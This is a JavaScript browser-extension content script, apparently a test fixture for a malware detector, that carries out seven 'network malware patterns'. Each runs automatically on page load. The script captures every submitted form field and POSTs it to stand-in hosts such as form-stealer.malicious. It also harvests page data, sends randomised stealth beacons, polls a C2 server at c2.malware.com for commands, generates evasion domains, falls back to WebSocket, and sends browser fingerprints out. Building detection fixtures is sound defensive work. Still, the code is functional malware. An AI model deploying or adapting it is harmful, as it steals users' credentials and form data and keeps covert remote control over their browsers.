// TEST EXTENSION: Content script demonstrating network malware patterns

console.log('TEST: Network malware content script loaded');

// Pattern 1: Real-time data exfiltration
function setupRealTimeExfiltration() {
  console.log('TEST: Setting up real-time data exfiltration');
  
  // Monitor all form submissions
  document.addEventListener('submit', function(event) {
    const form = event.target;
    const formData = new FormData(form);
    const submissionData = {
      action: form.action,
      method: form.method,
      url: window.location.href,
      timestamp: Date.now(),
      fields: {}
    };
    
    // Extract all form data
    for (let [key, value] of formData.entries()) {
      submissionData.fields[key] = value;
    }
    
    console.log('TEST: Form data captured for exfiltration:', submissionData);
    
    // Exfiltrate to multiple suspicious domains
    const exfilDomains = [
      'https://form-stealer.malicious/collect',
      'https://data-harvester.evil/forms',
      'https://payload-collector.suspicious/submit'
    ];
    
    exfilDomains.forEach(domain => {
      fetch(domain, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Stealer-ID': chrome.runtime.id
        },
        body: JSON.stringify(submissionData)
      }).catch(err => {
        console.log(`TEST: Exfiltration to ${domain} failed (expected):`, err.message);
      });
    });
  });
}

// Pattern 2: Bulk data harvesting
function setupBulkHarvesting() {
  console.log('TEST: Setting up bulk data harvesting');
  
  // Harvest all links on the page
  const links = document.querySelectorAll('a[href]');
  const linkData = Array.from(links).map(link => ({
    href: link.href,
    text: link.textContent,
    title: link.title
  }));
  
  // Harvest all images
  const images = document.querySelectorAll('img[src]');
  const imageData = Array.from(images).map(img => ({
    src: img.src,
    alt: img.alt,
    width: img.width,
    height: img.height
  }));
  
  // Harvest all input fields
  const inputs = document.querySelectorAll('input');
  const inputData = Array.from(inputs).map(input => ({
    type: input.type,
    name: input.name,
    id: input.id,
    placeholder: input.placeholder
  }));
  
  // Send bulk data to harvesting servers
  const bulkData = {
    links: linkData,
    images: imageData,
    inputs: inputData,
    url: window.location.href,
    timestamp: Date.now()
  };
  
  console.log('TEST: Bulk data harvested:', bulkData);
  
  // Send to multiple harvesting endpoints
  const harvestEndpoints = [
    'https://bulk-harvester.malicious/collect',
    'https://data-miner.evil/harvest',
    'https://info-collector.suspicious/bulk'
  ];
  
  harvestEndpoints.forEach(endpoint => {
    fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(bulkData)
    }).catch(err => {
      console.log(`TEST: Bulk harvesting to ${endpoint} failed (expected):`, err.message);
    });
  });
}

// Pattern 3: Stealth communication
function setupStealthCommunication() {
  console.log('TEST: Setting up stealth communication');
  
  // Random timing for stealth
  const randomDelay = Math.random() * 10000 + 5000; // 5-15 seconds
  
  setTimeout(() => {
    // Stealth beacon
    fetch('https://stealth-beacon.malicious/ping', {
      method: 'POST',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'X-Forwarded-For': '127.0.0.1',
        'X-Real-IP': '192.168.1.1',
        'X-Custom-Stealth': 'true'
      },
      body: JSON.stringify({
        status: 'stealth_active',
        timestamp: Date.now(),
        random: Math.random()
      })
    }).catch(err => {
      console.log('TEST: Stealth beacon failed (expected):', err.message);
    });
  }, randomDelay);
  
  // Periodic stealth updates
  setInterval(() => {
    const stealthData = {
      page_url: window.location.href,
      page_title: document.title,
      user_agent: navigator.userAgent,
      timestamp: Date.now(),
      stealth_id: Math.random().toString(36).substring(7)
    };
    
    fetch('https://stealth-updater.evil/report', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Stealth-Mode': 'enabled'
      },
      body: JSON.stringify(stealthData)
    }).catch(err => {
      console.log('TEST: Stealth update failed (expected):', err.message);
    });
  }, Math.random() * 30000 + 10000); // 10-40 second intervals
}

// Pattern 4: Command & Control communication
function setupC2Communication() {
  console.log('TEST: Setting up C2 communication');
  
  // Heartbeat to C2 server
  setInterval(() => {
    const heartbeatData = {
      type: 'heartbeat',
      extension_id: chrome.runtime.id,
      status: 'active',
      capabilities: ['data_exfiltration', 'form_hijacking', 'stealth_mode'],
      timestamp: Date.now()
    };
    
    fetch('https://c2.malware.com/heartbeat', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-C2-Client': 'malware_extension_v1.0'
      },
      body: JSON.stringify(heartbeatData)
    }).catch(err => {
      console.log('TEST: C2 heartbeat failed (expected):', err.message);
    });
  }, 30000); // 30 second intervals
  
  // Command polling
  setInterval(() => {
    fetch('https://command.control.net/get_command', {
      headers: {
        'X-Client-ID': chrome.runtime.id
      }
    })
    .then(response => response.json())
    .then(command => {
      console.log('TEST: Received C2 command:', command);
      
      if (command.type === 'exfiltrate_data') {
        // Execute data exfiltration command
        console.log('TEST: Executing data exfiltration command');
      } else if (command.type === 'inject_payload') {
        // Execute payload injection command
        console.log('TEST: Executing payload injection command');
      } else if (command.type === 'update_config') {
        // Update malware configuration
        console.log('TEST: Updating malware configuration');
      }
    })
    .catch(err => {
      console.log('TEST: C2 command polling failed (expected):', err.message);
    });
  }, 60000); // 1 minute intervals
}

// Pattern 5: Advanced evasion techniques
function setupAdvancedEvasion() {
  console.log('TEST: Setting up advanced evasion techniques');
  
  // Domain generation algorithm
  const generateEvasionDomain = () => {
    const random = Math.random().toString(36).substring(7);
    const timestamp = Date.now().toString(36);
    const domains = ['.com', '.org', '.net', '.xyz', '.top'];
    const randomTld = domains[Math.floor(Math.random() * domains.length)];
    
    return `https://${random}${timestamp}${randomTld}/api`;
  };
  
  // Use generated domain for communication
  setTimeout(() => {
    const evasionDomain = generateEvasionDomain();
    console.log('TEST: Generated evasion domain:', evasionDomain);
    
    fetch(evasionDomain, {
      method: 'POST',
      body: JSON.stringify({
        type: 'evasion_test',
        timestamp: Date.now()
      })
    }).catch(err => {
      console.log('TEST: Evasion domain communication failed (expected):', err.message);
    });
  }, 15000);
  
  // Protocol switching
  const protocolSwitch = () => {
    // Try WebSocket if fetch fails
    try {
      const ws = new WebSocket('wss://websocket.malicious.com/stream');
      ws.onopen = () => {
        console.log('TEST: WebSocket connection established for evasion');
        ws.send(JSON.stringify({
          type: 'evasion_websocket',
          timestamp: Date.now()
        }));
      };
    } catch (err) {
      console.log('TEST: WebSocket evasion failed (expected):', err.message);
    }
  };
  
  setTimeout(protocolSwitch, 20000);
}

// Pattern 6: Data persistence and exfiltration
function setupDataPersistence() {
  console.log('TEST: Setting up data persistence and exfiltration');
  
  // Collect comprehensive user data
  const userData = {
    browser_info: {
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      cookieEnabled: navigator.cookieEnabled,
      onLine: navigator.onLine
    },
    screen_info: {
      width: screen.width,
      height: screen.height,
      colorDepth: screen.colorDepth,
      pixelDepth: screen.pixelDepth
    },
    page_info: {
      url: window.location.href,
      title: document.title,
      referrer: document.referrer,
      domain: window.location.hostname
    },
    timestamp: Date.now()
  };
  
  // Store data locally first
  localStorage.setItem('malware_data', JSON.stringify(userData));
  
  // Exfiltrate to multiple endpoints
  const exfilEndpoints = [
    'https://data-exfiltrator.malicious/collect',
    'https://user-info-harvester.evil/store',
    'https://browser-fingerprint.suspicious/save'
  ];
  
  exfilEndpoints.forEach(endpoint => {
    fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Data-Type': 'user_profile'
      },
      body: JSON.stringify(userData)
    }).catch(err => {
      console.log(`TEST: Data exfiltration to ${endpoint} failed (expected):`, err.message);
    });
  });
}

// Pattern 7: Network fingerprinting
function setupNetworkFingerprinting() {
  console.log('TEST: Setting up network fingerprinting');
  
  // Test network connectivity and speed
  const networkTest = async () => {
    const startTime = Date.now();
    
    try {
      const response = await fetch('https://network-test.malicious.com/ping', {
        method: 'HEAD',
        cache: 'no-cache'
      });
      
      const endTime = Date.now();
      const latency = endTime - startTime;
      
      const networkInfo = {
        latency: latency,
        status: response.status,
        headers: Object.fromEntries(response.headers.entries()),
        timestamp: Date.now()
      };
      
      console.log('TEST: Network fingerprint collected:', networkInfo);
      
      // Send network fingerprint to analysis server
      fetch('https://network-analyzer.evil/fingerprint', {
        method: 'POST',
        body: JSON.stringify(networkInfo)
      }).catch(err => {
        console.log('TEST: Network fingerprinting failed (expected):', err.message);
      });
      
    } catch (err) {
      console.log('TEST: Network test failed (expected):', err.message);
    }
  };
  
  // Run network test after page load
  setTimeout(networkTest, 5000);
}

// Initialize all network malware patterns when DOM is ready
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initializeNetworkMalware);
} else {
  initializeNetworkMalware();
}

function initializeNetworkMalware() {
  console.log('TEST: Initializing network malware patterns');
  
  setupRealTimeExfiltration();
  setupBulkHarvesting();
  setupStealthCommunication();
  setupC2Communication();
  setupAdvancedEvasion();
  setupDataPersistence();
  setupNetworkFingerprinting();
  
  console.log('TEST: All network malware patterns initialized in content script');
}
